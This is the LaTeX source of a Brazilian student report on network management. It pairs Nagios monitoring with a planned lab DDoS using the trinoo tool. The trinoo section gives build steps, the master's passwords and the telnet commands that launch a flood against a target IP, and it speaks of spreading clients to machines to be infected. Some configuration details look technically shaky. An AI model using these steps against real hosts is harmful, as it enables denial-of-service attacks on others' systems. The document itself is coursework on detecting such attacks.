\documentclass[10pt,a4paper]{article}

\usepackage[brazil]{babel}
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{ae}
\usepackage{hyperref}
\usepackage{alltt}

\newcommand{\Nagios}{\textit{Nagios}}
\newcommand{\trinoo}{\textit{trinoo}}
\newcommand{\cbox}[1]
{
	\setlength\fboxrule{1pt}
	\begin{alltt}\fbox{#1}\end{alltt}
	\setlength\fboxrule{0.5pt}
}

\title{Segundo Trabalho de Administração e Gerenciamento de Redes\\---\\Relatório sobre o sistema \Nagios}
\author{
\begin{tabular}{lcr}
Arthur F. M. Nascimento & -- & 5634455\\
Karen H. Taga & -- & 5634688\\
Lucas F. Rosada & -- & 5634584\\
\end{tabular}}


\begin{document}

\maketitle

\tableofcontents


\section{Introdução}

O objetivo deste trabalho é estudar as funcionalidades de um Sistema de Gerenciamento de Redes de
Computadores. Compreende também a execução de uma ferramenta de ataque DDoS. Deve haver dois
oponentes e um ataque deve ser proferido de uma Vlan para outra Vlan. A idéia consiste em os
oponentes utilizarem o sistema de gerenciamento de redes e o protocolo SNMP para detectar o ataque
e então tentar contê-lo. (Excerto extraído da especificação do trabalho.)

A proposta do nosso grupo é usar o \Nagios, um Sistema de Gerenciamento de Redes de Computadores
conhecido, para monitorar os acessos a um host e mantê-lo seguro e seus serviços em funcionamento
apesar da carga da rede e do sistema.

Para simular o caso extremo de carga da rede alta devido ao uso normal ou ataques explícitos do
tipo DDoS, usaremos o \trinoo, que é um software malicioso desenvolvido com o intuito de executar
tais ataques.

\subsection{Sobre o \Nagios}

O programa \Nagios\ é um sistema de monitoramento de redes que auxilia a coleta de informações sobre
um computador ou uma rede de computadores. Ele permite que as organizações identifiquem e resolvam
problemas de infraestrutura de TI antes que eles gerem consequências negativas.

Dentre as facilidades que o \Nagios\ proporciona, estão incluídas:
\begin{description}
	\item[Monitoramento] de componentes da infraestrutura da rede, incluindo métricas de
	sistema, protocolos de rede, aplicações, serviços, servidores e topologia da rede;
	\item[Alertas] quando componentes da rede falham ou se recuperam, provendo informações sobre
	esses eventos importantes; entre outras.
\end{description}


\subsection{Sobre o \trinoo}

O \trinoo\ é um conjunto de programas cuja função é estabelecer um ataque DDoS. Ele não é um
vírus, mas uma ferramenta de ataque disponibilizada em Dezembro de 1999 e que já foi associada a
vários ataques conhecidos.

O componente cliente do \trinoo\ é aquele que realiza o ataque. O cliente é normalmente instalado no
computador infectado ou em um zumbi ou em qualquer outro lugar na internet. O componente cliente é
capaz de enviar muitos pacotes UDP para o computador alvo, que tenta processar e responder a estes
pacotes inválidos com mensagens "porta ICMP não-alcançável" para cada pacote UDP recebido. Por essa
razão ele logo ocupa toda a sua banda para isso, o que resulta em um DoS (\emph{Denial of Service}),
já que o computador fica sem comunicação com outros.

O \trinoo\ também tem um componente mestre que é usado para controlar o componente cliente. Isso
permite que o atacante controle múltiplos clientes remotamente através de alguns comandos simples.


\subsection{Conceitos}

Alguns conceitos que são revistos através deste trabalho incluem:

\begin{description}
	\item[DoS] Denial of Service é o ataque de \emph{flood} que impossibilita o host de se
	comunicar por ter as suas interfaces ocupadas com requisições ICMP falsas e respostas;
	\item[DDoS] Distributed DoS é o ataque DoS causado por vários zumbis executando em paralelo
	e de forma distribuída;
	\item[Zumbi] é o computador infectado por um programa malicioso que fica esperando o seu
	mestre estabelecer uma conexão e enviar comandos;
	\item[UDP] é o protocolo usado para o envio dos pacotes falsos;
	\item[IP] é o protocolo de endereçamento utilizado;
	\item[ICMP] é o protocolo cujos pacotes o \trinoo\ tenta simular para gerar uma falha
	no servidor (e consequentemente causar o envio de uma mensagem de erro do servidor);
	\item[SNMP] é o protocolo usado para se coletar dados administrativos dos componentes da
	rede.
\end{description}


\section{Instalação e Configuração dos programas}

\subsection{Instalação do \Nagios}

O processo de instalação será explicado com base na plataforma Linux, especificamente Debian e
distribuições derivadas para simplificar a explicação. Para instalar em outros sistemas, consulte
a documentação oficial do \Nagios.

Os pacotes necessários são: nagios3, apache2 e as dependências que eles possam precisar. Para
instalá-los, execute:

\cbox{\$\ sudo apt-get install nagios3 apache2}

Este comando deve pedir a senha de superusuário para iniciar o instalador e depois deve perguntar
ao usuário qual senha ele deseja que seja associada ao administrador do \Nagios\ (nagiosadmin).

Depois de instalar o \Nagios, certifique-se de que a interface web que ele disponibiliza está
disponível através do navegador acessando \url{http://localhost/nagios3/}. Se não for possível
acessá-la, será necessário conferir o estado do servidor Apache e do servidor \Nagios. Além
disso também precisamos informar ao Apache sobre as configurações da interface web do \Nagios.
Os passos são os seguintes:

Assegure-se de que o Apache tem as informações necessárias sobre a interface do \Nagios:

\cbox{\$\ sudo echo 'Include /etc/nagios3/apache2.conf' $>>$/etc/apache2/apache2.conf}

Agora inicialize o servidor Apache (ou reinicialeze-o, caso já esteja em execução):

\cbox{\$\ sudo /etc/init.d/apache2 start}

Por fim, inicialize o servidor \Nagios\ no host local:

\cbox{\$\ sudo /etc/init.d/nagios3 start}

Agora o \Nagios\ deve estar acessível pela interface web, onde é possível analisar os dados que
ele coleta a partir das suas configurações padrão.


\subsection{Configuração do \Nagios}

Para que o \Nagios\ detecte corretamente um ataque DDoS do \trinoo\ é necessário adicionar as
seguintes linhas ao arquivo \emph{/etc/nagios3/conf.d/localhost\_nagios2.cfg}:

\cbox{
define service\{
        use                    generic-service
        host\_name             localhost
        service\_description   UDP
        check\_command         check\_udp!22
        \}
}

Desta forma, quando um ataque DDoS estiver em execução, o \Nagios\ irá acusar falha no serviço,
aumento de latência e/ou perda de pacotes.


\subsection{Instalação do \trinoo}

Como o software foi desenvolvido dez anos atrás, o ambiente de compilação mudou muito e são
necessárias alguns conserto e alterações para que ele seja compilado com sucesso em todo Linux
atual. Essas alterações já foram feitas e o código melhorado está disponível publicamente no
\href{git://github.com/tureba/trinoo.git}{GitHub.org} atráves do \emph{git} (um sistema de
controle de versão distribuído).

Após o download do \trinoo, é necessário configurar os IPs de um ou mais mestres para os quais
os clientes irão responder. Eles precisam ser definidos na estrutura \emph{master} da linha 22
do arquivo \emph{client/client.c}.

Então compile o \trinoo\ com:

\cbox{\$\ make -s}

Neste momento o cliente foi criado e é o arquivo \emph{client/client}. O mestre é o arquivo
\emph{master/master}. Agora que o \trinoo\ foi compilado é necessário executá-lo. O cliente
precisa ser espalhado por máquinas que se deseja infectar, enquanto que o mestre será executado
na máquina cujo IP foi informado ao cliente no código-fonte.


\section{Experimentos}\label{sec:experimentos}

Serão configurados 5 computadores. O primeiro estará executando o \Nagios\ e será atacado pelos
outros. O segundo irá executar o mestre do ataque, controlando o ataque dos zumbis. Todos os
computadores terão clientes \trinoo\ sendo executados e com acesso ao alvo.

Então cada zumbi terá de ser iniciado executando o cliente \trinoo\ no computador:

\cbox{\$\ client/client}

Para se iniciar o \trinoo\ mestre:

\cbox{\$\ master/master
?? g0rave}

Agora, no computador com o mestre, lance o ataque:

\cbox{\$\ telnet <ip-do-mestre> 27665
Trying 127.0.0.1...
Connected to localhost.
Escape character is '\^\ $]$'.
betaalmostdone
mtimer <tempo-do-ataque>
dos <ip-do-alvo>
}

Neste momento os zumbis devem começar o ataque ao IP do alvo, o que deve ser identificado através
do monitoramento do \Nagios.


\section{Conclusões}

Através dos experimentos da Seção \ref{sec:experimentos} pudemos simular uma pequena rede de
computadores zumbis executando um ataque coordenado do tipo DDoS em um host. O host estava sendo
monitorado através do programa \Nagios\ de forma a fornecer informações de desempenho, carga no
sistema e possíveis falhas no serviço, que são úteis para tarefas gerenciais, administrativas,
de segurança e de escalabilidade.

Os zumbis foram criados usando o programa \trinoo, que é um software malicioso criado para gerar
ataques DDoS a um determinado alvo ao comando de um mestre. Esse ataque foi orquestrado para
tentar desestabilizar os serviços do host-alvo, o que foi detectado através do \Nagios.

Com este trabalho o grupo teve a oportunidade de aprender a usar uma ferramenta de Gerenciamento
de Redes de Computadores, adquirindo novos conhecimentos. Contudo, por falta de tempo a prática
ficou restrita ao planejamento, que foi efetuado com sucesso e em detalhes. A execução dos planos,
portanto, não foi feita para comparar os resultados esperados com os reais. Mesmo assim acreditamos
que muito foi aprendido através deste trabalho.


\section{Referências}

\begin{itemize}
	\item \href{http://www.nagios.org/}{Site do Nagios}
	\item \href{http://www.nagios.org/documentation/}{Site da documentação do Nagios}
	\item \href{http://nagios.sourceforge.net/docs/nagios-3.pdf}{Documentação do Nagios 3 (PDF)}
	\item \href{http://wiki.nagios.org/index.php/Main\_Page}{Wiki do Nagios}
	\item \href{http://en.wikipedia.org/wiki/Nagios}{Wikipedia: Nagios}
	\item \href{http://en.wikipedia.org/wiki/Trinoo}{Wikipedia: Trinoo}
	\item \href{http://service1.symantec.com/sarc/sarc.nsf/html/W32.DoS.Trinoo.html}{\trinoo\ no site da Symantec}
\end{itemize}

\end{document}
